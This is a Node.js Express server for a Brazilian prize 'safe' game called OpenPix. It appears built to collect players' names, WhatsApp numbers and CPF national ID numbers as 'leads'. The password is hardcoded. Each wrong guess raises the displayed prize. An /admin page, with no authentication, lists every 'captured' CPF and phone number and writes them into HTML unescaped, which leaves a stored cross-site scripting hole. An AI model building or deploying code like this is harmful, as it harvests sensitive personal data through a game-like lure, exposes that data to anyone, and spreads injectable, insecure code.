const express = require('express');
const app = express();
const fs = require('fs'); // Módulo para ler/escrever arquivos
const path = require('path');

app.use(express.json());
app.use(express.static('public'));

let cofre = {
    premioAtual: 500.00,
    senhaCorreta: "1234",
    tentativas: 0
};

// Arquivo onde salvaremos os leads (cadastro)
const ARQUIVO_LEADS = 'leads.json';

// --- ROTAS DO JOGO ---

// Salvar Cadastro (Lead)
app.post('/salvar-lead', (req, res) => {
    const novoUsuario = req.body;
    novoUsuario.data = new Date().toLocaleString('pt-BR');

    // Lê o arquivo atual ou cria lista vazia
    let leads = [];
    if (fs.existsSync(ARQUIVO_LEADS)) {
        const dados = fs.readFileSync(ARQUIVO_LEADS);
        leads = JSON.parse(dados);
    }

    // Adiciona novo usuario (se não for duplicado, opcional)
    leads.push(novoUsuario);

    // Salva no arquivo
    fs.writeFileSync(ARQUIVO_LEADS, JSON.stringify(leads, null, 2));
    
    res.json({ status: "ok" });
});

// Tentativa de abrir
app.post('/tentar', (req, res) => {
    const { senha } = req.body;
    cofre.tentativas++;
    
    if (senha === cofre.senhaCorreta) {
        res.json({ ganhou: true, premio: cofre.premioAtual });
    } else {
        cofre.premioAtual += 0.30;
        res.json({ ganhou: false, msg: "Senha incorreta", novoPremio: cofre.premioAtual });
    }
});

// --- ROTA ADMIN (O PAINEL DO DONO) ---
app.get('/admin', (req, res) => {
    let html = `
    <!DOCTYPE html>
    <html lang="pt-br">
    <head>
        <meta charset="UTF-8">
        <title>Painel do Dono | OpenPix</title>
        <script src="https://cdn.tailwindcss.com"></script>
    </head>
    <body class="bg-slate-900 text-white p-10">
        <h1 class="text-3xl font-bold text-yellow-500 mb-6">🕵️‍♂️ Painel de Leads (Capturados)</h1>
        <div class="bg-slate-800 rounded-lg overflow-hidden shadow-xl">
            <table class="w-full text-left">
                <thead class="bg-slate-700 text-slate-300">
                    <tr>
                        <th class="p-4">Data</th>
                        <th class="p-4">Nome</th>
                        <th class="p-4">WhatsApp</th>
                        <th class="p-4">CPF</th>
                    </tr>
                </thead>
                <tbody class="divide-y divide-slate-700">
    `;

    if (fs.existsSync(ARQUIVO_LEADS)) {
        const leads = JSON.parse(fs.readFileSync(ARQUIVO_LEADS));
        // Inverte para mostrar os mais novos primeiro
        leads.reverse().forEach(lead => {
            html += `
                <tr class="hover:bg-slate-700/50">
                    <td class="p-4 text-sm text-slate-400">${lead.data}</td>
                    <td class="p-4 font-bold">${lead.nome}</td>
                    <td class="p-4 text-green-400">${lead.tel}</td>
                    <td class="p-4 font-mono text-yellow-500/80">${lead.cpf}</td>
                </tr>
            `;
        });
    } else {
        html += `<tr><td colspan="4" class="p-10 text-center text-slate-500">Nenhum cadastro ainda.</td></tr>`;
    }

    html += `
                </tbody>
            </table>
        </div>
        <p class="mt-4 text-slate-500 text-sm">Total: ${fs.existsSync(ARQUIVO_LEADS) ? JSON.parse(fs.readFileSync(ARQUIVO_LEADS)).length : 0} leads capturados.</p>
    </body>
    </html>
    `;
    
    res.send(html);
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => console.log(`OpenPix rodando na porta ${PORT}`));
